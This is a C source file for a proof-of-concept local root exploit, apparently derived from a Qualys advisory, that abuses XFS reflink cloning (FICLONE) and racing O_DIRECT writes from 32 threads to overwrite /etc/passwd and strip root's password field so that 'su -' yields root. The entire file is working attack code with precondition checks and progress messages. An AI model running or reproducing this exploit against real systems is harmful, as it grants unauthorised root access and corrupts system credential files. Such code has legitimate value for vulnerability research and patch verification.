#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/fs.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/vfs.h>

#define NUM_THREADS 32
#define KB4 4096 
#define CLONE_FILE "/home/user/passwd.sync" //Must be in the same partition as /etc/passwd. On RHEL, /var/tmp is another dir to look at, but if you're in single-volume installs...

pthread_barrier_t start_barrier;

//Keep in mind these must be in the same st_dev device! There is a check in the main program.
//This PoC was derived from Qualys Security Advisory: https://openwall.com/lists/oss-security/2026/07/22/19

//Qualys suggests using background threads with ftruncate and fdatasync but I got it to work reliably with less so this is it!

//Compile with gcc refluxfs.c -o refluxfs -lpthread

void *thread_code(void *arg) {
    char *buf = (char*) arg;
    pthread_barrier_wait(&start_barrier);

    int fd = open(CLONE_FILE, O_WRONLY|O_DIRECT);
    if (fd < 0) {
        printf("Err O_DIRECT %d\n", errno); //Useful to check for too many open FD's
        pthread_exit(NULL);
    }
    int ret = pwrite(fd, buf, strlen(buf), 0);
    if (ret < 0) {
        printf("Err WRITE %d\n", errno); //Useful to check when you forget to mem align your buf to 4k.
        close(fd);
        pthread_exit(NULL);
    }
    close(fd);
    pthread_exit(NULL);
}

void launch_threads(int src_fd, int dest_fd, char* buf) {
    pthread_t threads[NUM_THREADS];
    int rc = pthread_barrier_init(&start_barrier, NULL, NUM_THREADS);

    if (rc != 0) {
        printf("pthread_barrier\n");
        exit(4);
    }

    for (int i = 0; i < NUM_THREADS; ++i) {
        rc = pthread_create(&threads[i], NULL, thread_code, (void*)buf);
        if (rc != 0) {
            printf("Error creating thread %d\n", i);
            exit(5);
        }
    }

    for (int i = 0; i < NUM_THREADS; ++i) {
        pthread_join(threads[i], NULL);
    }

    pthread_barrier_destroy(&start_barrier);

}

int setup(char *buf) {
    int src_fd = open("/etc/passwd", O_RDONLY);
    if (src_fd < 0) {
        printf("/etc/passwd does not exist or we are unable to read it. Huh\n");
        exit(1);
    }
    int dest_fd = open(CLONE_FILE, O_RDWR|O_CREAT|O_TRUNC, 00777);
    if (dest_fd < 0) {
        printf("Error opening " CLONE_FILE "\n");
        exit(2);
    }
    int ret = ioctl(dest_fd, FICLONE, src_fd);
    if (ret < -1) {
        printf("IOCTL did not work\n");
        exit(3);
    }

    launch_threads(src_fd, dest_fd, buf);

    int coso = open("/etc/passwd", O_RDONLY);
    if (coso < 0) {
        exit(1);
    }

    char buf2[8];
    int rd = read(coso, buf2, 8);
    close(coso);
    if (strncmp("root:x:0", buf2, 8)) {    
        close(src_fd);
        close(dest_fd);
        return 0;
    }
    else {
        posix_fadvise(src_fd, 0, 0, POSIX_FADV_DONTNEED);
        close(src_fd);
        close(dest_fd);
        return 1;
    }
}


int main() {

    int src_fd = open("/etc/passwd", O_RDONLY);
    if (src_fd < 0) {
        printf("/etc/passwd does not exist or we are unable to open it. Huh\n");
        exit(1);
    }

    int dest_fd = open(CLONE_FILE, O_RDWR|O_CREAT|O_TRUNC, 00777);
    if (dest_fd < 0) {
        printf("Error opening" CLONE_FILE " \n");
        exit(2);
    }

    int src_storage_device = 0;
    int dest_storage_device = 0;

    struct stat *statbuf = malloc(sizeof(struct stat));
    int ret = fstat(src_fd, statbuf);

    src_storage_device = statbuf -> st_dev;
    ret = fstat(dest_fd, statbuf);
    dest_storage_device = statbuf -> st_dev;

    if (src_storage_device != dest_storage_device) {
        printf("Devices dont match! %d, %d\n", src_storage_device, dest_storage_device);
        exit(10);
    }

    printf("Asserted both source and destination file are in the same device...\n");

    struct statfs *statfsbuf = malloc(sizeof(struct statfs));
    ret = fstatfs(dest_fd, statfsbuf);

    
    if (statfsbuf -> f_type != 0x58465342) {
        printf("Filesystem is not XFS, not vulnerable, %#16lx, exiting.\n", statfsbuf -> f_type);
        printf("Check man 2 statfs to see which filesystems those are.\n");
        exit(11);
    }
    else {
        printf("Asserted we are in XFS...\n");
    }

    ret = ioctl(dest_fd, FICLONE, src_fd);
    if (ret < -1) {
        exit(3);
    }

    printf("Asserted FICLONE is working successfully.\n");

    //Align is required for pwrite to work.
    char buf[KB4] __attribute__ ((aligned(KB4))); 

    int read_amount = read(src_fd, buf, KB4);

    //012345
    //root:x:
    memmove(buf + 5, buf + 6, read_amount-6);

    //Poor mans padding, some sort of memcpy was probs better
    for (int i = read_amount; i < KB4; ++i) {
        buf[i] = ' ';
    }
    buf[KB4] = '\0';

    printf("Printing /etc/passwd that will be overwritten\n");
    write(1, buf, read_amount);
    write(1, "\n", 1);

    close(src_fd);

    printf("Starting to cycle with background threads... Program should terminate within less than 10 seconds or ktap mitigation is there...\n");

    ret = setup(buf);
    while (ret == 1) {
        ret = setup(buf);
    }

    printf("/etc/passwd overwritten, you should be able to use su - on a shell to ride to root!\n");
}
